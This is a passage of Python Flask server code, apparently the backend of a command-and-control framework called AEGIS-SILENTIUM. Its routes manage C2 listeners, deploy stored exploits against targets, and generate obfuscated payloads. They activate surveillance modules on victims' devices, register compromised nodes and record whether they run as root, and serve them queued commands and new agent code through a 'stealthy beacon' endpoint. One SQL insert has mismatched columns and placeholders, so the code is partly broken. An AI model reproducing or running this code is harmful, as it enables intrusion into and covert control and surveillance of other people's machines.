    return jsonify({"webhooks": _webhooks.list_webhooks()})

@app.route("/api/webhooks", methods=["POST"])
@_require_permission("settings:edit")
def register_webhook():
    d = request.get_json(silent=True) or {}
    url    = d.get("url", "").strip()
    events = d.get("events", ["*"])
    if not url:
        return _err("url is required.", status=400)
    try:
        row = _webhooks.register(
            url         = url,
            events      = events,
            secret      = d.get("secret", ""),
            created_by  = _operator(),
            description = d.get("description", ""),
        )
        return jsonify(row), 201
    except ValueError as e:
        return _err(str(e), status=400)

@app.route("/api/webhooks/<wid>/deactivate", methods=["POST"])
@_require_permission("settings:edit")
def deactivate_webhook(wid: str):
    ok = _webhooks.deactivate(wid)
    if not ok:
        return _err("Webhook not found.", status=404)
    return jsonify({"status": "deactivated", "webhook_id": wid})

@app.route("/api/webhooks/<wid>/deliveries")
@_require_permission("settings:view")
def webhook_deliveries(wid: str):
    limit = min(200, int(request.args.get("limit", 50)))
    rows  = _webhooks.delivery_log(wid, limit)
    return jsonify({"deliveries": rows, "webhook_id": wid})

# ══════════════════════════════════════════════════════════════════════════════
# ADMIN — ALERTS
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/alerts", methods=["GET"])
@_require_permission("dashboard:view")
def list_alerts():
    status = request.args.get("status", "firing")
    limit  = min(500, int(request.args.get("limit", 100)))
    try:
        with _pool.cursor() as cur:
            cur.execute(
                "SELECT * FROM alerts WHERE status=%s ORDER BY fired_at DESC LIMIT %s",
                (status, limit),
            )
            cols = [d[0] for d in cur.description]
            rows = [dict(zip(cols, r)) for r in cur.fetchall()]
        return jsonify({"alerts": rows, "count": len(rows)})
    except Exception as e:
        return _err(str(e), status=500)

@app.route("/api/alerts/<int:aid>/acknowledge", methods=["POST"])
@_require_permission("dashboard:view")
def acknowledge_alert(aid: int):
    try:
        with _pool.cursor() as cur:
            cur.execute(
                "UPDATE alerts SET status='acknowledged', acknowledged_by=%s, "
                "acknowledged_at=NOW() WHERE id=%s RETURNING id",
                (_operator(), aid),
            )
            if not cur.fetchone():
                return _err("Alert not found.", status=404)
        return jsonify({"status": "acknowledged", "id": aid})
    except Exception as e:
        return _err(str(e), status=500)

# ══════════════════════════════════════════════════════════════════════════════
# DATA RETENTION
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/admin/retention/run", methods=["POST"])
@_require_permission("settings:edit")
def run_retention():
    """Manually trigger the data retention sweep."""
    from scheduler.retention import run_retention_sweep
    try:
        result = run_retention_sweep(get_pg)
        return jsonify(result)
    except Exception as e:
        return _err(str(e), status=500)

# ══════════════════════════════════════════════════════════════════════════════
# LISTENERS  (permission-gated)
# ══════════════════════════════════════════════════════════════════════════════



@app.route("/api/teamchat/<channel>", methods=["GET"])
@_require_permission("dashboard:view")
def teamchat_get(channel):
    """Get recent messages from a team chat channel."""
    limit = request.args.get("limit", 50, type=int)
    try:
        msgs = _teamchat_mgr.get_messages(channel, limit=limit) if _teamchat_mgr else []
    except Exception:
        msgs = []
    return jsonify({"channel": channel, "messages": msgs, "count": len(msgs)})


@app.route("/api/teamchat/<channel>", methods=["POST"])
@_require_permission("dashboard:view")
def teamchat_post(channel):
    """Post a message to a team chat channel."""
    d = request.get_json(silent=True) or {}
    msg = d.get("message", "").strip()
    if not msg:
        return _err("message required", status=400)
    try:
        if _teamchat_mgr:
            _teamchat_mgr.post_message(channel, msg, operator=_operator())
    except Exception as e:
        return _err(str(e), status=500)
    return jsonify({"status": "sent", "channel": channel})

@app.route("/api/listeners", methods=["GET"])
@_require_permission("listeners:view")
@_require_rate("operator_api")
def list_listeners():
    page, per_page = _pagination()
    try:
        result = _get_listener_mgr().list(
            status   = request.args.get("status") or None,
            type_    = (request.args.get("type") or "").upper() or None,
            page=page, per_page=per_page,
        )
        return jsonify(result)
    except Exception as e:
        return _err(str(e), status=500)

@app.route("/api/listeners", methods=["POST"])
@_require_permission("listeners:create")
def create_listener():
    d = request.get_json(silent=True) or {}
    missing = [f for f in ("name", "type", "host") if not d.get(f)]
    if missing:
        return _err(f"Missing: {', '.join(missing)}", status=400)
    try:
        row = _get_listener_mgr().create(
            name=d["name"], listener_type=d["type"], host=d["host"],
            port=d.get("port"), c2_profile=d.get("c2_profile", "default"),
            operator=_operator(), bind_ip=d.get("bind_ip", "0.0.0.0"),
            notes=d.get("notes", ""),
        )
        emit("listener_created", f"Listener '{row['name']}' created by {_operator()}")
        return jsonify(row), 201
    except RuntimeError as e:
        return _err(str(e), status=409)
    except ValueError as e:
        return _err(str(e), status=400, fields=getattr(e, "fields", None))
    except Exception as e:
        return _err(str(e), status=500)

@app.route("/api/listeners/<lid>", methods=["GET"])
@_require_permission("listeners:view")
def get_listener(lid):
    row = _get_listener_mgr().get(lid)
    return jsonify(row) if row else _err("Not found.", status=404)

@app.route("/api/listeners/<lid>", methods=["PATCH"])
@_require_permission("listeners:create")
def update_listener(lid):
    d = request.get_json(silent=True) or {}
    try:
        return jsonify(_get_listener_mgr().update(lid, d))
    except KeyError as e:
        return _err(str(e), status=404)
    except ValueError as e:
        return _err(str(e), status=400)

@app.route("/api/listeners/<lid>", methods=["DELETE"])
@_require_permission("listeners:delete")
def delete_listener(lid):
    if not _get_listener_mgr().delete(lid):
        return _err("Not found.", status=404)
    emit("listener_deleted", f"Listener {lid} deleted by {_operator()}")
    return jsonify({"status": "deleted", "listener_id": lid})

@app.route("/api/listeners/<lid>/start", methods=["POST"])
@_require_permission("listeners:start")
def start_listener(lid):
    try:
        return jsonify(_get_listener_mgr().start(lid))
    except KeyError:
        return _err("Not found.", status=404)

@app.route("/api/listeners/<lid>/stop", methods=["POST"])
@_require_permission("listeners:stop")
def stop_listener(lid):
    try:
        return jsonify(_get_listener_mgr().stop(lid))
    except KeyError:
        return _err("Not found.", status=404)

@app.route("/api/listeners/summary")
@_require_permission("listeners:view")
def listeners_summary():
    return jsonify(_get_listener_mgr().summary())

@app.route("/api/listeners/options")
@_require_permission("listeners:view")
def listener_options():
    return jsonify({"types": LISTENER_TYPES, "c2_profiles": C2_PROFILES})

# ══════════════════════════════════════════════════════════════════════════════
# EXPLOITS
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/exploits", methods=["GET"])
@_require_permission("exploits:view")
def list_exploits():
    page, per_page = _pagination()
    try:
        return jsonify(_get_exploit_mgr().list(
            exploit_type=request.args.get("type") or None,
            target=request.args.get("target") or None,
            severity=(request.args.get("severity") or "").upper() or None,
            status=request.args.get("status") or None,
            search=request.args.get("q") or None,
            sort_by=request.args.get("sort_by", "cvss"),
            order=request.args.get("order", "desc"),
            page=page, per_page=per_page,
        ))
    except Exception as e:
        return _err(str(e), status=500)

@app.route("/api/exploits", methods=["POST"])
@_require_permission("exploits:create")
def create_exploit():
    d = request.get_json(silent=True) or {}
    try:
        return jsonify(_get_exploit_mgr().create(d)), 201
    except ValueError as e:
        return _err(str(e), status=400, fields=getattr(e, "fields", None))

@app.route("/api/exploits/<int:eid>", methods=["GET"])
@_require_permission("exploits:view")
def get_exploit(eid):
    row = _get_exploit_mgr().get(eid)
    return jsonify(row) if row else _err("Not found.", status=404)

@app.route("/api/exploits/<int:eid>", methods=["PATCH"])
@_require_permission("exploits:create")
def update_exploit(eid):
    d = request.get_json(silent=True) or {}
    try:
        return jsonify(_get_exploit_mgr().update(eid, d))
    except (KeyError, ValueError) as e:
        return _err(str(e), status=404 if isinstance(e, KeyError) else 400)

@app.route("/api/exploits/<int:eid>", methods=["DELETE"])
@_require_permission("exploits:delete")
def delete_exploit(eid):
    if not _get_exploit_mgr().delete(eid):
        return _err("Not found.", status=404)
    return jsonify({"status": "deleted", "id": eid})

@app.route("/api/exploits/<int:eid>/deploy", methods=["POST"])
@_require_permission("exploits:deploy")
def deploy_exploit(eid):
    d = request.get_json(silent=True) or {}
    target = d.get("target", "").strip()
    if not target:
        return _err("target is required.", status=400)
    try:
        row = _get_exploit_mgr().deploy(eid, target, _operator())
        emit("exploit_deployed", f"Exploit {eid} → {target} by {_operator()}", "warning")
        return jsonify(row)
    except (KeyError, ValueError) as e:
        return _err(str(e), status=404 if isinstance(e, KeyError) else 400)

@app.route("/api/exploits/<int:eid>/transition", methods=["POST"])
@_require_permission("exploits:create")
def transition_exploit(eid):
    d      = request.get_json(silent=True) or {}
    status = d.get("status", "").strip()
    if not status:
        return _err("status is required.", status=400)
    try:
        return jsonify(_get_exploit_mgr().transition(eid, status, _operator()))
    except (KeyError, ValueError) as e:
        return _err(str(e), status=400)

@app.route("/api/exploits/summary")
@_require_permission("exploits:view")
def exploits_summary():
    return jsonify(_get_exploit_mgr().summary())

@app.route("/api/exploits/sync", methods=["POST"])
@_require_permission("exploits:create")
def sync_exploits():
    return jsonify(_get_exploit_mgr().sync_nvd())

# ══════════════════════════════════════════════════════════════════════════════
# PAYLOADS
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/payloads/options")
@_require_permission("payloads:view")
def payload_options():
    return jsonify({
        "payload_types": PAYLOAD_TYPES, "output_formats": OUTPUT_FORMATS,
        "obfuscations": OBFUSCATIONS, "architectures": ARCHITECTURES,
        "exit_functions": EXIT_FUNCTIONS,
    })

@app.route("/api/payloads", methods=["GET"])
@_require_permission("payloads:view")
def list_payloads():
    page, per_page = _pagination()
    try:
        return jsonify(_get_payload_mgr().list(
            operator=request.args.get("operator") or None,
            payload_type=request.args.get("payload_type") or None,
            status=request.args.get("status") or None,
            sort_by=request.args.get("sort_by", "created"),
            order=request.args.get("order", "desc"),
            page=page, per_page=per_page,
        ))
    except Exception as e:
        return _err(str(e), status=500)

@app.route("/api/payloads/generate", methods=["POST"])
@_require_permission("payloads:generate")
@_require_rate("generate_payload")
def generate_payload():
    d = request.get_json(silent=True) or {}
    required = ("payload_type", "output_format", "obfuscation", "arch")
    missing  = [f for f in required if not d.get(f)]
    if missing:
        return _err(f"Missing: {', '.join(missing)}", status=400)
    try:
        result = _get_payload_mgr().generate(
            payload_type=d["payload_type"], listener_id=d.get("listener_id", ""),
            output_format=d["output_format"], obfuscation=d["obfuscation"],
            arch=d["arch"], options=d.get("options", {}), operator=_operator(),
            exit_function=d.get("exit_function", "NtExitProcess"),
        )
        emit("payload_generated", f"'{result['filename']}' built by {_operator()}", "info")
        return jsonify(result), 201
    except ValueError as e:
        return _err(str(e), status=400, fields=getattr(e, "fields", None))

@app.route("/api/payloads/<bid>", methods=["GET"])
@_require_permission("payloads:view")
def get_payload(bid):
    row = _get_payload_mgr().get(bid)
    return jsonify(row) if row else _err("Not found.", status=404)

@app.route("/api/payloads/<bid>", methods=["DELETE"])
@_require_permission("payloads:delete")
def delete_payload(bid):
    if not _get_payload_mgr().delete(bid):
        return _err("Not found.", status=404)
    return jsonify({"status": "deleted", "build_id": bid})

@app.route("/api/payloads/summary")
@_require_permission("payloads:view")
def payloads_summary():
    return jsonify(_get_payload_mgr().summary())

# ══════════════════════════════════════════════════════════════════════════════
# SURVEILLANCE
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/surveillance/targets", methods=["GET"])
@_require_permission("surveillance:view")
def list_surv_targets():
    page, per_page = _pagination()
    try:
        return jsonify(_get_surv_mgr().list_targets(
            status=request.args.get("status") or None, page=page, per_page=per_page,
        ))
    except Exception as e:
        return _err(str(e), status=500)

@app.route("/api/surveillance/targets", methods=["POST"])
@_require_permission("surveillance:create")
def create_surv_target():
    d = request.get_json(silent=True) or {}
    missing = [f for f in ("label", "device_type", "os_name", "os_version") if not d.get(f)]
    if missing:
        return _err(f"Missing: {', '.join(missing)}", status=400)
    try:
        row = _get_surv_mgr().create_target(
            label=d["label"], device_type=d["device_type"],
            os_name=d["os_name"], os_version=d["os_version"],
            node_id=d.get("node_id"), notes=d.get("notes", ""),
        )
        emit("surveillance_target_created", f"Target '{row['label']}' by {_operator()}")
        return jsonify(row), 201
    except RuntimeError as e:
        return _err(str(e), status=409)
    except ValueError as e:
        return _err(str(e), status=400)

@app.route("/api/surveillance/targets/<int:tid>", methods=["GET"])
@_require_permission("surveillance:view")
def get_surv_target(tid):
    row = _get_surv_mgr().get_target(tid)
    return jsonify(row) if row else _err("Not found.", status=404)

@app.route("/api/surveillance/targets/<int:tid>", methods=["DELETE"])
@_require_permission("surveillance:delete")
def delete_surv_target(tid):
    if not _get_surv_mgr().delete_target(tid):
        return _err("Not found.", status=404)
    return jsonify({"status": "deleted", "id": tid})

@app.route("/api/surveillance/targets/<int:tid>/modules/<mod>/activate", methods=["POST"])
@_require_permission("surveillance:activate")
def activate_surv_module(tid, mod):
    d = request.get_json(silent=True) or {}
    try:
        return jsonify(_get_surv_mgr().activate_module(tid, mod, d.get("config")))
    except (KeyError, ValueError) as e:
        return _err(str(e), status=404 if isinstance(e, KeyError) else 400)

@app.route("/api/surveillance/targets/<int:tid>/modules/<mod>/deactivate", methods=["POST"])
@_require_permission("surveillance:activate")
def deactivate_surv_module(tid, mod):
    if not _get_surv_mgr().deactivate_module(tid, mod):
        return _err("Module not found or already idle.", status=404)
    return jsonify({"status": "idle", "target_id": tid, "module": mod})

@app.route("/api/surveillance/targets/<int:tid>/modules/<mod>/data", methods=["POST"])
def push_surv_data(tid, mod):
    # Node agents push data — rate limited but no operator auth required
    allowed, headers = _rl.check(request.remote_addr, preset="ingest_data")
    if not allowed:
        return _err("Rate limited.", status=429), 429
    d  = request.get_json(silent=True) or {}
    ok = _get_surv_mgr().ingest_data(tid, mod, d)
    return (jsonify({"status": "recorded"}), 200) if ok else (_err("Module not found.", status=404))

@app.route("/api/surveillance/summary")
@_require_permission("surveillance:view")
def surveillance_summary():
    return jsonify(_get_surv_mgr().summary())

@app.route("/api/surveillance/modules")
@_require_permission("surveillance:view")
def list_surv_modules():
    tid_raw = request.args.get("target_id")
    try:   tid = int(tid_raw) if tid_raw else None
    except (ValueError, TypeError, KeyError): tid = None
    modules = _get_surv_mgr().list_modules(
        target_id=tid, status=request.args.get("status") or None
    )
    return jsonify({"modules": modules, "total": len(modules)})

# ══════════════════════════════════════════════════════════════════════════════
# TEAM CHAT
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/chat/messages", methods=["GET"])
@_require_permission("chat:view")
def get_chat_messages():
    channel  = request.args.get("channel", "general")
    limit    = min(500, max(1, int(request.args.get("limit", 100))))
    before   = int(b) if (b := request.args.get("before_id")) and b.isdigit() else None
    after    = int(a) if (a := request.args.get("after_id"))  and a.isdigit() else None
    msgs     = _get_chat_mgr().history(channel=channel, limit=limit,
                                       before_id=before, after_id=after)
    return jsonify({"messages": msgs, "channel": channel, "count": len(msgs)})

@app.route("/api/chat/messages", methods=["POST"])
@_require_permission("chat:post")
@_require_rate("operator_api")
def post_chat_message():
    d = request.get_json(silent=True) or {}
    try:
        op = _operator()
        _get_chat_mgr().heartbeat(op)
        row = _get_chat_mgr().post(op, d.get("message", ""), d.get("channel", "general"))
        return jsonify(row), 201
    except ValueError as e:
        return _err(str(e), status=400)

@app.route("/api/chat/channels")
@_require_permission("chat:view")
def chat_channels():
    return jsonify(_get_chat_mgr().all_channels_summary())

@app.route("/api/chat/operators")
@_require_permission("chat:view")
def chat_operators_online():
    ops = _get_chat_mgr().operators_online(
        window_seconds=int(request.args.get("window", 300))
    )
    return jsonify({"operators": ops, "count": len(ops)})

@app.route("/api/chat/messages/<int:mid>", methods=["DELETE"])
@_require_permission("chat:delete")
def delete_chat_message(mid):
    if not _get_chat_mgr().delete_message(mid):
        return _err("Not found.", status=404)
    return jsonify({"status": "deleted", "id": mid})

@app.route("/api/chat/search")
@_require_permission("chat:view")
def search_chat():
    q = request.args.get("q", "").strip()
    if not q:
        return _err("q is required.", status=400)
    try:
        results = _get_chat_mgr().search(q,
            channel=request.args.get("channel") or None,
            limit=min(200, int(request.args.get("limit", 50))))
        return jsonify({"results": results, "count": len(results)})
    except ValueError as e:
        return _err(str(e), status=400)

# ══════════════════════════════════════════════════════════════════════════════
# PRESENCE HEARTBEAT
# ══════════════════════════════════════════════════════════════════════════════

@app.before_request
def _presence_heartbeat():
    sess = getattr(g, "_session", None)
    if sess and sess.operator:
        try:
            _get_chat_mgr().heartbeat(sess.operator)
        except Exception as _exc:
            log.debug("_presence_heartbeat: %s", _exc)

# ══════════════════════════════════════════════════════════════════════════════
# STARTUP
# ══════════════════════════════════════════════════════════════════════════════

log.info(
    "AEGIS-SILENTIUM v12.0 starting  "
    "pool=%s  redis=%s  rbac=%s  webhooks=running",
    "ok" if _pool else "UNAVAILABLE",
    "ok" if R else "UNAVAILABLE",
    "ok" if _rbac else "degraded",
)

# ══════════════════════════════════════════════════════════════════════════════
# AEGIS-SILENTIUM v12 — All routes: beacon protocol, operator REST, distributed API
# Distributed systems primitives exposed under /api/distributed/*
# ══════════════════════════════════════════════════════════════════════════════

import socket
import struct
import base64
import ipaddress
import hashlib
import hmac as _hmac

# ── Encryption helpers (backward-compat with v8 beacon protocol) ──────────────
_C2_SECRET  = os.environ.get("OPERATOR_KEY", "").encode()  # no hardcoded default
_BEACON_LPOLL = int(os.environ.get("BEACON_LPOLL", "25"))
_MESH_PORT    = int(os.environ.get("MESH_PORT", "5001"))

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes as _hashes
    _fernet_key = base64.urlsafe_b64encode(
        PBKDF2HMAC(algorithm=_hashes.SHA256(), length=32,
                   salt=b"aegis-silentium-v12", iterations=100_000
                   ).derive(_C2_SECRET)
    )
    CIPHER = Fernet(_fernet_key)
except Exception:
    CIPHER = None


def enc(d: dict) -> str:
    if CIPHER:
        return CIPHER.encrypt(json.dumps(d).encode()).decode()
    return base64.urlsafe_b64encode(json.dumps(d).encode()).decode()


def dec(token: str) -> dict:
    if CIPHER:
        try:
            return json.loads(CIPHER.decrypt(token.encode()).decode())
        except Exception as _e:
            log.debug("dec() fernet decrypt failed: %s", type(_e).__name__)
    return json.loads(base64.urlsafe_b64decode(token.encode() + b"==").decode())


# ── Distributed systems import ────────────────────────────────────────────────
import sys as _sys
_sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
try:
    from distributed import (
        HybridLogicalClock, MerkleTree, WriteAheadLog, WALStateMachine,
        GossipProtocol, FencingTokenManager, MVCCStore,
        ConsistencyLevel, AntiEntropyScheduler,
        TwoPCCoordinator, Mutation, LeaseCache, SpeculativeReadBuffer,
        StateVerifier, ConsistentHashRing, BloomFilter,
        PriorityTaskQueue, PriorityTask, DeadLetterQueue,
        AdaptiveLoadBalancer, Backend, ChaosRunner,
        SagaOrchestrator, SagaDefinition, SagaState, SagaStep,
        ServiceRegistry, ServiceInstance, ServiceState,
    )
    _DISTRIBUTED_AVAILABLE = True
except ImportError as _e:
    log.warning("Distributed module import failed: %s", _e)
    _DISTRIBUTED_AVAILABLE = False

# ── v11 intelligence, consensus, network, plugins, streaming ──────────────────
_INTELLIGENCE_AVAILABLE = False
_ioc_mgr   = None
_mitre     = None
_threat_graph = None
try:
    from intelligence.ioc_manager  import IOCManager, IOC, IOCType, IOCSeverity
    from intelligence.mitre_attack import MITREMapper
    from intelligence.threat_graph import ThreatGraph, ThreatActor, EdgeType, NodeKind
    _ioc_mgr      = IOCManager(auto_expire=True)
    _mitre        = MITREMapper()
    _threat_graph = ThreatGraph()
    _INTELLIGENCE_AVAILABLE = True
except ImportError as _e:
    log.warning("Intelligence module unavailable: %s", _e)

_CONSENSUS_AVAILABLE = False
_raft_node = None
try:
    from consensus.raft import RaftNode, RaftConfig, RaftState, LogEntry as RaftLogEntry
    from consensus.state_machine import KVStateMachine
    _kv_sm = KVStateMachine()
    _CONSENSUS_AVAILABLE = True
except ImportError as _e:
    log.warning("Consensus module unavailable: %s", _e)

_NETWORK_AVAILABLE = False
_topology = None
try:
    from network.topology import NetworkTopology, NetworkNode, NetworkEdge, NetworkPath, NodeRole
    from network.scanner  import AsyncPortScanner, ScanResult, PortState
    _topology = NetworkTopology()
    _NETWORK_AVAILABLE = True
except ImportError as _e:
    log.warning("Network module unavailable: %s", _e)

_PLUGINS_AVAILABLE = False
_plugin_engine = None
try:
    from plugins.engine import PluginEngine, PluginHook, PluginStatus
    _plugin_engine = PluginEngine(
        plugin_dir=os.environ.get("AEGIS_PLUGIN_DIR", "plugins"),
        secret_key=os.environ.get("AEGIS_PLUGIN_SECRET", ""),
    )
    _plugin_engine.discover()
    _plugin_engine.enable_all()
    _PLUGINS_AVAILABLE = True
except ImportError as _e:
    log.warning("Plugin engine unavailable: %s", _e)

_STREAMING_AVAILABLE = False
_event_log  = None
_projector  = None
try:
    from streaming.event_log import EventLog, EventLogWriter
    from streaming.projector import (
        EventProjector, make_node_status_view,
        make_campaign_summary_view, make_alert_counter_view,
    )
    _event_log = EventLog()
    _projector = EventProjector(_event_log)
    _projector.register_view_all_topics(make_node_status_view())
    _projector.register_view_all_topics(make_campaign_summary_view())
    _projector.register_view_all_topics(make_alert_counter_view())
    _projector.start()
    _STREAMING_AVAILABLE = True
except ImportError as _e:
    log.warning("Streaming module unavailable: %s", _e)

# ── Distributed singletons ─────────────────────────────────────────────────────
_hlc     = HybridLogicalClock("c2-primary") if _DISTRIBUTED_AVAILABLE else None
_wal     = WriteAheadLog() if _DISTRIBUTED_AVAILABLE else None
_sm      = WALStateMachine(_wal) if (_DISTRIBUTED_AVAILABLE and _wal) else None
_ring    = ConsistentHashRing() if _DISTRIBUTED_AVAILABLE else None
_dlq     = DeadLetterQueue() if _DISTRIBUTED_AVAILABLE else None
_lb      = AdaptiveLoadBalancer(strategy="least_connections") if _DISTRIBUTED_AVAILABLE else None
_chaos   = ChaosRunner() if _DISTRIBUTED_AVAILABLE else None
_bloom   = BloomFilter(capacity=100_000, error_rate=0.001) if _DISTRIBUTED_AVAILABLE else None
_ptq     = PriorityTaskQueue() if _DISTRIBUTED_AVAILABLE else None
_fencing = FencingTokenManager() if _DISTRIBUTED_AVAILABLE else None
_svc_reg = ServiceRegistry() if _DISTRIBUTED_AVAILABLE else None
_saga    = SagaOrchestrator() if _DISTRIBUTED_AVAILABLE else None

# ── SILENTIUM ECDHE session store ─────────────────────────────────────────────
_silentium_sessions: dict = {}
_silentium_sess_lock = threading.Lock()
_SESS_TTL = 600
_SILENTIUM_HAS_ECDHE = False
try:
    from cryptography.hazmat.primitives.asymmetric import ec as _ec
    from cryptography.hazmat.backends import default_backend as _default_backend
    _SILENTIUM_HAS_ECDHE = True
except ImportError:
    pass


# ══════════════════════════════════════════════════════════════════════════════
# NODE REGISTRATION & BEACON PROTOCOL
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/node/register", methods=["POST"])
def node_register():
    data = request.get_json(silent=True) or {}
    try:
        payload = dec(data["payload"])
    except Exception:
        return _err("decrypt failed", status=400, code="DECRYPT_FAILED")

    node_id  = payload.get("node_id") or str(uuid.uuid4())
    ext_ip   = payload.get("external_ip", "")
    hostname = payload.get("hostname", "")
    caps     = payload.get("capabilities", {})
    os_name  = caps.get("os", "")
    is_root  = bool(caps.get("is_root", False))

    conn = get_pg()
    try:
        with conn.cursor() as c:
            c.execute("""
                INSERT INTO nodes(node_id,ip_address,external_ip,capabilities,hostname,os_type,is_elevated,username,arch)
                VALUES(%s,%s,%s,%s,%s,%s,%s)
                ON CONFLICT(node_id) DO UPDATE SET
                    last_seen=NOW(), ip_address=EXCLUDED.ip_address, external_ip=EXCLUDED.external_ip,
                    capabilities=EXCLUDED.capabilities, hostname=EXCLUDED.hostname,
                    os_type=EXCLUDED.os_type, is_elevated=EXCLUDED.is_elevated,
                    username=EXCLUDED.username, arch=EXCLUDED.arch, status='active'
            """, (node_id, request.remote_addr, ext_ip or None,
                  json.dumps(caps), hostname, os_name, is_root,
                  payload.get('username',''), payload.get('arch','')))
            conn.commit()
    finally:
        if _pool:
            _pool._pool.putconn(conn)

    if _bloom:
        _bloom.add(f"node:{node_id}")
    if _ring:
        _ring.add_node(node_id)

    emit("node_register",
         f"Node {node_id[:12]} registered ({hostname}@{os_name} root={is_root})", "info")
    ts = _hlc.now().to_dict() if _hlc else {}
    return jsonify({"token": enc({"node_id": node_id, "status": "registered", "ts": ts})})

@app.route("/")
def dashboard_root():
    """Serve the dashboard HTML."""
    import os
    dash_path = os.path.join(os.path.dirname(__file__), "..", "dashboard", "dashboard.html")
    dash_path = os.path.normpath(dash_path)
    if os.path.exists(dash_path):
        with open(dash_path, "r", encoding="utf-8") as f:
            return f.read(), 200, {"Content-Type": "text/html; charset=utf-8"}
    return jsonify({"status": "online", "version": _VERSION}), 200





@app.route("/api/node/heartbeat", methods=["POST"])
def node_heartbeat():
    data = request.get_json(silent=True) or {}
    try:
        payload = dec(data["payload"])
    except Exception:
        return _err("decrypt failed", status=400, code="DECRYPT_FAILED")

    node_id     = payload.get("node_id", "")
    last_result = payload.get("last_result")

    conn = get_pg()
    try:
        with conn.cursor() as c:
            c.execute("UPDATE nodes SET last_seen=NOW(),status='active' WHERE node_id=%s", (node_id,))
            conn.commit()
    finally:
        if _pool:
            _pool._pool.putconn(conn)

    if last_result:
        emit("node_result", f"Node {node_id[:12]} result: {str(last_result)[:100]}", "info")

    cmd_key = f"cmd:{node_id}"
    cmd = ""
    if R:
        try:
            cmd = R.lpop(cmd_key) or ""
        except Exception as _e:
            log.debug("Redis lpop: %s", _e)
            cmd = ""

    ts = _hlc.now().to_dict() if _hlc else {}
    return jsonify({"token": enc({"command": cmd, "ts": ts})})


@app.route("/api/node/task/next", methods=["POST"])
def node_task_next():
    data = request.get_json(silent=True) or {}
    try:
        payload = dec(data["payload"])
    except Exception:
        return _err("decrypt failed", status=400, code="DECRYPT_FAILED")

    node_id = payload.get("node_id", "")

    # Honour priority queue if populated
    if _ptq and len(_ptq) > 0:
        pt = _ptq.pop(timeout=0.1)
        if pt and pt.payload:
            return jsonify({"token": enc({"task": pt.payload})})

    conn = get_pg()
    try:
        from psycopg2.extras import RealDictCursor as _RDC
        with conn.cursor(cursor_factory=_RDC) as c:
            c.execute("""
                SELECT * FROM tasks
                WHERE status='queued'
                  AND (assigned_to IS NULL OR assigned_to='')
                ORDER BY priority DESC, created_at ASC
                LIMIT 1 FOR UPDATE SKIP LOCKED
            """)
            task = c.fetchone()
            if task:
                c.execute("UPDATE tasks SET status='running',assigned_to=%s,"
                          "started_at=NOW() WHERE task_uuid=%s",
                          (node_id, task["task_uuid"]))
                conn.commit()
                emit("task_assigned", f"Task {str(task['task_uuid'])[:12]} → {node_id[:12]}", "info")
                return jsonify({"token": enc({"task": {
                    "task_uuid":   task["task_uuid"],
                    "target":      task["target"],
                    "action":      task.get("action", "recon"),
                    "campaign_id": task.get("campaign_id"),
                    "priority":    task.get("priority", 1),
                }})})
            conn.commit()
    finally:
        if _pool:
            _pool._pool.putconn(conn)

    return jsonify({"token": enc({"task": None})})


@app.route("/api/node/task/result", methods=["POST"])
def node_task_result():
    data = request.get_json(silent=True) or {}
    try:
        payload = dec(data["payload"])
    except Exception:
        return _err("decrypt failed", status=400, code="DECRYPT_FAILED")

    task_uuid = payload.get("task_uuid", "")
    node_id   = payload.get("node_id", "")
    result    = payload.get("result", {})
    status    = payload.get("status", "completed")
    logs      = str(payload.get("logs", ""))[:10000]
    vuln_cnt  = len(result.get("vulns", []))
    crit_cnt  = int(result.get("crit_count", 0))
    duration  = float(result.get("duration", 0))

    conn = get_pg()
    try:
        with conn.cursor() as c:
            c.execute("""
                UPDATE tasks SET status=%s, completed_at=NOW(), result=%s, logs=%s,
                    vuln_count=%s, crit_count=%s, duration=%s
                WHERE task_uuid=%s
            """, (status, json.dumps(result), logs, vuln_cnt, crit_cnt, duration, task_uuid))
            c.execute("SELECT id FROM tasks WHERE task_uuid=%s", (task_uuid,))
            row = c.fetchone()
            if row:
                tid = row[0]
                for v in result.get("vulns", []):
                    if not isinstance(v, dict):
                        continue
                    c.execute("""
                        INSERT INTO vulnerabilities(task_id,url,vuln_type,severity,details,payload,evidence)
                        VALUES(%s,%s,%s,%s,%s,%s,%s)
                    """, (tid, str(v.get("url",""))[:512], str(v.get("vuln_type",""))[:128],
                           str(v.get("severity",""))[:20], str(v.get("detail",""))[:2000],
                           str(v.get("payload",""))[:1000], str(v.get("evidence",""))[:2000]))
            conn.commit()
    finally:
        if _pool:
            _pool._pool.putconn(conn)

    # WAL record
    if _sm:
        _sm.set(f"task:{task_uuid}:status", status)

    sev = "critical" if crit_cnt else ("high" if vuln_cnt else "info")
    emit("task_complete",
         f"Task {task_uuid[:12]} done {duration:.0f}s — {vuln_cnt} vulns ({crit_cnt} crit)",
         sev)
    return jsonify({"status": "ok"})


@app.route("/api/node/update", methods=["POST"])
def node_update():
    data = request.get_json(silent=True) or {}
    try:
        payload = dec(data["payload"])
    except Exception:
        return _err("decrypt failed", status=400, code="DECRYPT_FAILED")
    new_code = R.get("agent_update") if R else None
    if new_code:
        return jsonify({"token": enc({"update_available": True, "code": new_code})})
    return jsonify({"token": enc({"update_available": False})})


@app.route("/b/<node_id>", methods=["GET", "POST"])
def beacon(node_id: str):
    """Stealthy beacon endpoint. GET long-polls for commands, POST ingests data."""
    if request.method == "POST":
        raw = request.get_data(as_text=True)
        if R:
            R.publish("beacon_in", json.dumps({"node": node_id, "data": raw[:4096]}))
            R.setex(f"aegis:node:beacon:{node_id}", 86400, str(time.time()))
        conn = get_pg()
        try:
            with conn.cursor() as c:
                c.execute("UPDATE nodes SET last_seen=NOW() WHERE node_id=%s", (node_id,))
                conn.commit()
        finally:
            if _pool:
                _pool._pool.putconn(conn)
        return Response("OK", status=200, mimetype="text/plain")

    key = f"cmd:{node_id}"
    cmd = ""
    if R:
        try:
            result = R.blpop(key, timeout=_BEACON_LPOLL)
            cmd = result[1] if result else ""
        except Exception as _e:
            log.debug("Redis blpop: %s", _e)
    return Response(cmd or "", status=200, mimetype="application/octet-stream")


